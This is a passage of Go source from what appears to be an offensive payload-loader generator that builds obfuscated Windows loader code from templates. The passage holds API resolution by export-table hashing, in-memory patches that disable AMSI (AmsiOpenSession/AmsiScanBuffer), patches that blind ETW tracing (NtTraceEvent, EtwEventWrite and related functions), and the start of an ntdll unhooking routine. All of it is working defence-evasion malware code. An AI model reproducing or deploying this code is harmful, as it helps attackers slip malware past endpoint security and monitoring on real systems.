    {{.Vars.ddLength}} = {{.Vars.p}}.OptionalHeader.(*pe.OptionalHeader32).NumberOfRvaAndSizes
  }

  if {{.Vars.ddLength}} < pe.IMAGE_DIRECTORY_ENTRY_EXPORT+1 {
    return &windows.LazyProc{}, "", errors.New(` + ObfuscateStr("error getting exports entries", str_obfs) + `)
  }

  var {{.Vars.edd}} pe.DataDirectory
  if {{.Vars.pe64}} {
    {{.Vars.edd}} = {{.Vars.p}}.OptionalHeader.(*pe.OptionalHeader64).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
  } else {
    {{.Vars.edd}} = {{.Vars.p}}.OptionalHeader.(*pe.OptionalHeader32).DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]
  }

  var {{.Vars.ds}} *pe.Section
  {{.Vars.ds}} = nil
  for _, {{.Vars.s}} := range {{.Vars.p}}.Sections {
    if {{.Vars.s}}.VirtualAddress <= {{.Vars.edd}}.VirtualAddress && {{.Vars.edd}}.VirtualAddress < {{.Vars.s}}.VirtualAddress+{{.Vars.s}}.VirtualSize {
      {{.Vars.ds}} = {{.Vars.s}}
      break
    }
  }

  if {{.Vars.ds}} == nil {
    return &windows.LazyProc{}, "", errors.New(` + ObfuscateStr("no section was found", str_obfs) + `)
  }

  {{.Vars.d}}, {{.Vars.err}} := {{.Vars.ds}}.Data()
  if {{.Vars.err}} != nil {
    return &windows.LazyProc{}, "", {{.Vars.err}}
  }

  {{.Vars.exportDirOffset}} := {{.Vars.edd}}.VirtualAddress - {{.Vars.ds}}.VirtualAddress
  {{.Vars.dxd}} := {{.Vars.d}}[{{.Vars.exportDirOffset}}:]

  var {{.Vars.dt}} ExportDirectory
  {{.Vars.dt}}.ExportFlags = binary.LittleEndian.Uint32({{.Vars.dxd}}[0:4])
  {{.Vars.dt}}.TimeDateStamp = binary.LittleEndian.Uint32({{.Vars.dxd}}[4:8])
  {{.Vars.dt}}.MajorVersion = binary.LittleEndian.Uint16({{.Vars.dxd}}[8:10])
  {{.Vars.dt}}.MinorVersion = binary.LittleEndian.Uint16({{.Vars.dxd}}[10:12])
  {{.Vars.dt}}.NameRVA = binary.LittleEndian.Uint32({{.Vars.dxd}}[12:16])
  {{.Vars.dt}}.OrdinalBase = binary.LittleEndian.Uint32({{.Vars.dxd}}[16:20])
  {{.Vars.dt}}.NumberOfFunctions = binary.LittleEndian.Uint32({{.Vars.dxd}}[20:24])
  {{.Vars.dt}}.NumberOfNames = binary.LittleEndian.Uint32({{.Vars.dxd}}[24:28])
  {{.Vars.dt}}.AddressTableAddr = binary.LittleEndian.Uint32({{.Vars.dxd}}[28:32])
  {{.Vars.dt}}.NameTableAddr = binary.LittleEndian.Uint32({{.Vars.dxd}}[32:36])
  {{.Vars.dt}}.OrdinalTableAddr = binary.LittleEndian.Uint32({{.Vars.dxd}}[36:40])

  {{.Vars.dt}}.DllName, _ = {{.Vars.get_string_func}}({{.Vars.d}}, int({{.Vars.dt}}.NameRVA-{{.Vars.ds}}.VirtualAddress))

  {{.Vars.ordinalTable}} := make(map[uint16]uint32)

  if {{.Vars.dt}}.OrdinalTableAddr > {{.Vars.ds}}.VirtualAddress && {{.Vars.dt}}.NameTableAddr > {{.Vars.ds}}.VirtualAddress {
    {{.Vars.dno}} := {{.Vars.d}}[{{.Vars.dt}}.OrdinalTableAddr-{{.Vars.ds}}.VirtualAddress:]
    {{.Vars.dnn}} := {{.Vars.d}}[{{.Vars.dt}}.NameTableAddr-{{.Vars.ds}}.VirtualAddress:]

    for {{.Vars.n}} := uint32(0); {{.Vars.n}} < {{.Vars.dt}}.NumberOfNames; {{.Vars.n}}++ {
      {{.Vars.ord}} := binary.LittleEndian.Uint16({{.Vars.dno}}[{{.Vars.n}}*2 : ({{.Vars.n}}*2)+2])
      {{.Vars.nameRVA}} := binary.LittleEndian.Uint32({{.Vars.dnn}}[{{.Vars.n}}*4 : ({{.Vars.n}}*4)+4])
      {{.Vars.ordinalTable}}[{{.Vars.ord}}] = {{.Vars.nameRVA}}
    }
    {{.Vars.dno}} = nil
    {{.Vars.dnn}} = nil
  }

  {{.Vars.dna}} := {{.Vars.d}}[{{.Vars.dt}}.AddressTableAddr-{{.Vars.ds}}.VirtualAddress:]

  var {{.Vars.exports}} []Export
  for {{.Vars.i}} := uint32(0); {{.Vars.i}} < {{.Vars.dt}}.NumberOfFunctions; {{.Vars.i}}++ {
    var {{.Vars.export}} Export
    {{.Vars.export}}.VirtualAddress = binary.LittleEndian.Uint32({{.Vars.dna}}[{{.Vars.i}}*4 : ({{.Vars.i}}*4)+4])
    {{.Vars.export}}.Ordinal = {{.Vars.dt}}.OrdinalBase + {{.Vars.i}}

    if {{.Vars.ds}}.VirtualAddress <= {{.Vars.export}}.VirtualAddress &&
      {{.Vars.export}}.VirtualAddress < {{.Vars.ds}}.VirtualAddress+{{.Vars.ds}}.VirtualSize {
      {{.Vars.export}}.Forward, _ = {{.Vars.get_string_func}}({{.Vars.d}}, int({{.Vars.export}}.VirtualAddress-{{.Vars.ds}}.VirtualAddress))
    }

    _, {{.Vars.ok}} := {{.Vars.ordinalTable}}[uint16({{.Vars.i}})]
    if {{.Vars.ok}} {
      {{.Vars.nameRVA}}, _ := {{.Vars.ordinalTable}}[uint16({{.Vars.i}})]
      {{.Vars.export}}.Name, _ = {{.Vars.get_string_func}}({{.Vars.d}}, int({{.Vars.nameRVA}}-{{.Vars.ds}}.VirtualAddress))
    }
    
    {{.Vars.exports}} = append({{.Vars.exports}}, {{.Vars.export}})
  }

  for _, {{.Vars.exp}} := range {{.Vars.exports}} {
    if {{.Vars.hash}} == {{.Vars.hashing_func}}({{.Vars.exp}}.Name) {
      return windows.NewLazyDLL({{.Vars.dll}}).NewProc({{.Vars.exp}}.Name), {{.Vars.exp}}.Name, nil
    }
  }

  return &windows.LazyProc{}, "", errors.New(` + ObfuscateStr("function not found", str_obfs) + `)
}
    `

    get_string_func := `
func {{.Vars.get_string_func}}({{.Vars.section}} []byte, {{.Vars.start}} int) (string, bool) {
  if {{.Vars.start}} < 0 || {{.Vars.start}} >= len({{.Vars.section}}) {
    return "", false
  }

  for {{.Vars.end}} := {{.Vars.start}}; {{.Vars.end}} < len({{.Vars.section}}); {{.Vars.end}}++ {
    if {{.Vars.section}}[{{.Vars.end}}] == 0 {
      return string({{.Vars.section}}[{{.Vars.start}}:{{.Vars.end}}]), true
    }
  }

  return "", false
}
`

    // append previous functions
    functions = utils.AppendString(functions, ParseTemplate(hashing_func, Main))
    functions = utils.AppendString(functions, ParseTemplate(get_string_func, Main))
    functions = utils.AppendString(functions, ParseTemplate(get_func_ptr_func, Main))
  }

  // add AMSI patch function to loader
  if (!noamsi) {

    if (verbose) {
      fmt.Println("  > Adding AMSI patch...")
      time.Sleep(100 * time.Millisecond)
    }

    // define variables
    Main.Vars["amsi_patch_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["GetCurrentProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtProtectVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtWriteVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["AmsiOpenSession"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["AmsiScanBuffer"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["amsi"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["patch"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["oldProtect"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["memPage"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pHandle"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["addr"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["addr2"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars[""] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["i"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r2"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["regionsize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["numberOfBytesToProtect"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["baseAddress"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["amsi_patch"] = utils.RandomString(utils.RandomInt(9,10))

    // append needed exports and imports
    imports = utils.AppendSlice(imports, []string{"fmt", "golang.org/x/sys/windows", "unsafe"})

    // define code using templates
    amsi_patch_func := `
func {{.Vars.amsi_patch_func}}() error {`

  if (utils.RandomInt(1, 2) == 1) {
    if (hashing) {
      amsi_patch_func = amsi_patch_func + `
    {{.Vars.GetCurrentProcess}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GetCurrentProcess", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
    {{.Vars.NtWriteVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtWriteVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
    {{.Vars.NtProtectVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtProtectVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
    {{.Vars.AmsiOpenSession}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("AmsiOpenSession", rand_num)) + `, ` + ObfuscateStr("amsi.dll", str_obfs) + `, {{.Vars.hashing_func}})
  `
    } else {
      amsi_patch_func = amsi_patch_func + `
    {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
    {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)
    {{.Vars.amsi}} := windows.NewLazyDLL(` + ObfuscateStr("amsi.dll", str_obfs) + `)
    {{.Vars.GetCurrentProcess}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("GetCurrentProcess", str_obfs) + `)
    {{.Vars.NtWriteVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtWriteVirtualMemory, str_obfs) + `)
    {{.Vars.NtProtectVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtProtectVirtualMemory, str_obfs) + `)
    {{.Vars.AmsiOpenSession}} := {{.Vars.amsi}}.NewProc(` + ObfuscateStr("AmsiOpenSession", str_obfs) + `)
  `
    }

    amsi_patch_func = amsi_patch_func + `
    {{.Vars.patch}} := []byte{0x75}

    var {{.Vars.oldProtect}} uint32
    var {{.Vars.memPage}} uintptr = 0x1000

    {{.Vars.pHandle}}, _, _ := {{.Vars.GetCurrentProcess}}.Call()

    {{.Vars.addr}} := {{.Vars.AmsiOpenSession}}.Addr()
    {{.Vars.addr2}} := {{.Vars.AmsiOpenSession}}.Addr()

    for {{.Vars.i}} := 0; {{.Vars.i}} < 1024; {{.Vars.i}}++ {
      if *(*byte)(unsafe.Pointer({{.Vars.addr}} + uintptr({{.Vars.i}}))) == 0x74 {
        {{.Vars.addr}} = {{.Vars.addr}} + uintptr(1)
        break
      }
    }

    {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(uintptr({{.Vars.pHandle}}), uintptr(unsafe.Pointer(&{{.Vars.addr}})), uintptr(unsafe.Pointer(&{{.Vars.memPage}})), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
    if {{.Vars.r1}} != 0 {
      return {{.Vars.err}}
    }

    for {{.Vars.i}} := 0; {{.Vars.i}} < 1024; {{.Vars.i}}++ {
      if *(*byte)(unsafe.Pointer({{.Vars.addr2}} + uintptr({{.Vars.i}}))) == 0x74 {
        {{.Vars.addr2}} = {{.Vars.addr2}} + uintptr(1)
        break
      }
    }

    var {{.Vars.regionsize}} uintptr
    {{.Vars.NtWriteVirtualMemory}}.Call(uintptr({{.Vars.pHandle}}), {{.Vars.addr2}}, uintptr(unsafe.Pointer(&{{.Vars.patch}}[0])), uintptr(len({{.Vars.patch}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})))

    {{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(uintptr({{.Vars.pHandle}}), uintptr(unsafe.Pointer(&{{.Vars.addr2}})), uintptr(unsafe.Pointer(&{{.Vars.memPage}})), uintptr({{.Vars.oldProtect}}), uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
    if {{.Vars.r2}} != 0 {
      return {{.Vars.err}}
    }

    return nil
  }
`
    } else {
      if (hashing) {
        amsi_patch_func = amsi_patch_func + `
  {{.Vars.NtWriteVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtWriteVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtProtectVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtProtectVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.AmsiScanBuffer}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("AmsiScanBuffer", rand_num)) + `, ` + ObfuscateStr("amsi.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
      } else {
        amsi_patch_func = amsi_patch_func + `
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)
  {{.Vars.amsi}} := windows.NewLazyDLL(` + ObfuscateStr("amsi.dll", str_obfs) + `)
  {{.Vars.NtWriteVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtWriteVirtualMemory, str_obfs) + `)
  {{.Vars.NtProtectVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtProtectVirtualMemory, str_obfs) + `)
  {{.Vars.AmsiScanBuffer}} := {{.Vars.amsi}}.NewProc(` + ObfuscateStr("AmsiScanBuffer", str_obfs) + `)
`
      }

      amsi_patch_func = amsi_patch_func + `
  var {{.Vars.amsi_patch}} = []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}
  {{.Vars.baseAddress}} := {{.Vars.AmsiScanBuffer}}.Addr()
  {{.Vars.numberOfBytesToProtect}} := uintptr(len({{.Vars.amsi_patch}}))
  var {{.Vars.oldProtect}} uintptr

  {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Vars.baseAddress}})), uintptr(unsafe.Pointer(&{{.Vars.numberOfBytesToProtect}})), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
  if {{.Vars.r1}} != 0 {
    return {{.Vars.err}}
  }

  {{.Vars.NtWriteVirtualMemory}}.Call(uintptr(0xffffffffffffffff), {{.Vars.AmsiScanBuffer}}.Addr(), uintptr(unsafe.Pointer(&{{.Vars.amsi_patch}}[0])), unsafe.Sizeof({{.Vars.amsi_patch}}), 0)

  {{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&{{.Vars.baseAddress}})), uintptr(unsafe.Pointer(&{{.Vars.numberOfBytesToProtect}})), uintptr({{.Vars.oldProtect}}), uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
  if {{.Vars.r2}} != 0 {
    return {{.Vars.err}}
  }

  return nil
}
`
    }

    // append previous function
    functions = utils.AppendString(functions, ParseTemplate(amsi_patch_func, Main))
  }

  // add ETW patch function to loader
  if (!noetw) {

    if (verbose) {
      fmt.Println("  > Adding ETW patch...")
    }
    time.Sleep(100 * time.Millisecond)

    // define variables
    Main.Vars["etw_patch_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["GetCurrentProcess"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["etw_func_to_patch"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtWriteVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtProtectVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["kernel32"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["patch"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["oldProtect"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["pHandle"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["regionsize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["addr"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r2"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["WriteProcessMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["EtwEventWrite"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["EtwEventWriteEx"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["EtwEventWriteFull"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["EtwEventWriteString"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["EtwEventWriteTransfer"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["addresses"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["i"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["data"] = utils.RandomString(utils.RandomInt(9,10))


    imports = utils.AppendSlice(imports, []string{"golang.org/x/sys/windows", "unsafe"}) // needed imports

    // define code using templates
    etw_patch_func := `
func {{.Vars.etw_patch_func}}() error {`

    if (utils.RandomInt(1, 2) == 1) {

      var etw_func_to_patch string
      // use one of the main NT functions used by ETW to patch it
      if (utils.RandomInt(1,2) == 1) {
        etw_func_to_patch = "NtTraceEvent"
      } else {
        etw_func_to_patch = "NtTraceControl"
      }

      if (hashing) {
        etw_patch_func = etw_patch_func + `
  {{.Vars.GetCurrentProcess}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("GetCurrentProcess", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.etw_func_to_patch}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(etw_func_to_patch, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtWriteVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtWriteVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.NtProtectVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtProtectVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
      } else {
        etw_patch_func = etw_patch_func + `
  {{.Vars.kernel32}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `)
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)
  {{.Vars.GetCurrentProcess}} := {{.Vars.kernel32}}.NewProc(` + ObfuscateStr("GetCurrentProcess", str_obfs) + `)
  {{.Vars.etw_func_to_patch}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(etw_func_to_patch, str_obfs) + `)
  {{.Vars.NtWriteVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtWriteVirtualMemory, str_obfs) + `)
  {{.Vars.NtProtectVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtProtectVirtualMemory, str_obfs) + `)
`
      }

      etw_patch_func = etw_patch_func + `
  {{.Vars.pHandle}}, _, _ := {{.Vars.GetCurrentProcess}}.Call()

  var {{.Vars.patch}} = []byte{0xc3}
  var {{.Vars.oldProtect}} uintptr
  var {{.Vars.addr}} uintptr = {{.Vars.etw_func_to_patch}}.Addr()
  {{.Vars.regionsize}} := uintptr(len({{.Vars.patch}}))

  {{.Vars.r1}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call({{.Vars.pHandle}}, uintptr(unsafe.Pointer(&{{.Vars.addr}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
  if {{.Vars.r1}} != 0 {
    return {{.Vars.err}}
  }

  {{.Vars.NtWriteVirtualMemory}}.Call({{.Vars.pHandle}}, {{.Vars.addr}}, uintptr(unsafe.Pointer(&{{.Vars.patch}}[0])), uintptr(len({{.Vars.patch}})), 0)

  {{.Vars.r2}}, _, {{.Vars.err}} := {{.Vars.NtProtectVirtualMemory}}.Call({{.Vars.pHandle}}, uintptr(unsafe.Pointer(&{{.Vars.addr}})), uintptr(unsafe.Pointer(&{{.Vars.regionsize}})), uintptr({{.Vars.oldProtect}}), uintptr(unsafe.Pointer(&{{.Vars.oldProtect}})))
  if {{.Vars.r2}} != 0 {
    return {{.Vars.err}}
  }

  return nil
}
`
    } else {

      if (hashing) {
        etw_patch_func = etw_patch_func + `
  {{.Vars.WriteProcessMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("WriteProcessMemory", rand_num)) + `, ` + ObfuscateStr("kernel32.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.EtwEventWrite}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("EtwEventWrite", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.EtwEventWriteEx}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("EtwEventWriteEx", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.EtwEventWriteFull}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("EtwEventWriteFull", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.EtwEventWriteString}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("EtwEventWriteString", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
  {{.Vars.EtwEventWriteTransfer}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash("EtwEventWriteTransfer", rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
      } else {
        etw_patch_func = etw_patch_func + `
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)
  {{.Vars.WriteProcessMemory}} := windows.NewLazyDLL(` + ObfuscateStr("kernel32.dll", str_obfs) + `).NewProc(` + ObfuscateStr("WriteProcessMemory", str_obfs) + `)

  {{.Vars.EtwEventWrite}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("EtwEventWrite", str_obfs) + `)
  {{.Vars.EtwEventWriteEx}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("EtwEventWriteEx", str_obfs) + `)
  {{.Vars.EtwEventWriteFull}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("EtwEventWriteFull", str_obfs) + `)
  {{.Vars.EtwEventWriteString}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("EtwEventWriteString", str_obfs) + `)
  {{.Vars.EtwEventWriteTransfer}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr("EtwEventWriteTransfer", str_obfs) + `)
`
      }

      etw_patch_func = etw_patch_func + `
  {{.Vars.addresses}} := []uintptr{ {{.Vars.EtwEventWriteFull}}.Addr(), {{.Vars.EtwEventWrite}}.Addr(), {{.Vars.EtwEventWriteEx}}.Addr(), {{.Vars.EtwEventWriteString}}.Addr(), {{.Vars.EtwEventWriteTransfer}}.Addr() }

  for {{.Vars.i}} := range {{.Vars.addresses}} {
    {{.Vars.data}}, _ := hex.DecodeString(string([]byte{'4', '8', '3', '3', 'C', '0', 'C', '3'}))

    {{.Vars.WriteProcessMemory}}.Call(uintptr(0xffffffffffffffff), uintptr({{.Vars.addresses}}[{{.Vars.i}}]), uintptr(unsafe.Pointer(&{{.Vars.data}}[0])), uintptr(len({{.Vars.data}})), 0)
  }

  return nil
}
`

      imports = utils.AppendString(imports, "encoding/hex")
    }

    // append previous function
    functions = utils.AppendString(functions, ParseTemplate(etw_patch_func, Main))
  }

  if (unhook != "") {
    if (verbose) {
      fmt.Println("  > Adding unhooking function...")
    }

    time.Sleep(100 * time.Millisecond)
  }

  var unhook_func string

  if (unhook == "full") {

    imports = utils.AppendSlice(imports, []string{"io/ioutil", "debug/pe", "golang.org/x/sys/windows", "unsafe", "strings"}) // needed imports
    dlls_to_unhook = utils.AppendString(dlls_to_unhook, "C:\\Windows\\System32\\ntdll.dll")

    Main.Vars["unhook_func"] = utils.RandomString(utils.RandomInt(10,12))
    Main.Vars["dlls_to_unhook"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_to_unhook"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["NtProtectVirtualMemory"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["ntdll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["f"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["err"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["file"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["x"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["size"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_bytes"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_handle"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_base"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["dll_offset"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["regionsize"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["oldProtect"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r1"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["i"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["loc"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["mem"] = utils.RandomString(utils.RandomInt(9,10))
    Main.Vars["r2"] = utils.RandomString(utils.RandomInt(9,10))

    unhook_func = `
func {{.Vars.unhook_func}}({{.Vars.dlls_to_unhook}} []string) error {
`

    if (hashing) {
      unhook_func = unhook_func + `
  {{.Vars.NtProtectVirtualMemory}}, _, _ := {{.Vars.get_func_ptr_func}}(` + ConvertStr(GenerateHash(NtProtectVirtualMemory, rand_num)) + `, ` + ObfuscateStr("ntdll.dll", str_obfs) + `, {{.Vars.hashing_func}})
`
    } else {
      unhook_func = unhook_func + `
  {{.Vars.ntdll}} := windows.NewLazyDLL(` + ObfuscateStr("ntdll.dll", str_obfs) + `)
	{{.Vars.NtProtectVirtualMemory}} := {{.Vars.ntdll}}.NewProc(` + ObfuscateStr(NtProtectVirtualMemory, str_obfs) + `)
`
    }

    unhook_func = unhook_func + `
  for _, {{.Vars.dll_to_unhook}} := range {{.Vars.dlls_to_unhook}} {
    if (!strings.HasPrefix({{.Vars.dll_to_unhook}}, "C:\\")) {
      {{.Vars.dll_to_unhook}} = "C:\\Windows\\System32\\" + {{.Vars.dll_to_unhook}}
    }

    {{.Vars.f}}, {{.Vars.err}} := ioutil.ReadFile({{.Vars.dll_to_unhook}})
    if {{.Vars.err}} != nil {
      return {{.Vars.err}}
    }

    {{.Vars.file}}, {{.Vars.err}} := pe.Open({{.Vars.dll_to_unhook}})
    if {{.Vars.err}} != nil {
      return {{.Vars.err}}
    }

    {{.Vars.x}} := {{.Vars.file}}.Section(` + ObfuscateStr(".text", str_obfs) + `)
    {{.Vars.size}} := {{.Vars.x}}.Size
    {{.Vars.dll_bytes}} := {{.Vars.f}}[{{.Vars.x}}.Offset:{{.Vars.x}}.Size]

    {{.Vars.dll}}, {{.Vars.err}} := windows.LoadDLL({{.Vars.dll_to_unhook}})
    if {{.Vars.err}} != nil {
      return {{.Vars.err}}
    }

    {{.Vars.dll_handle}} := {{.Vars.dll}}.Handle
    {{.Vars.dll_base}} := uintptr({{.Vars.dll_handle}})
    {{.Vars.dll_offset}} := uint({{.Vars.dll_base}}) + uint({{.Vars.x}}.VirtualAddress)
    
    {{.Vars.regionsize}} := uintptr({{.Vars.size}})
    var {{.Vars.oldProtect}} uintptr

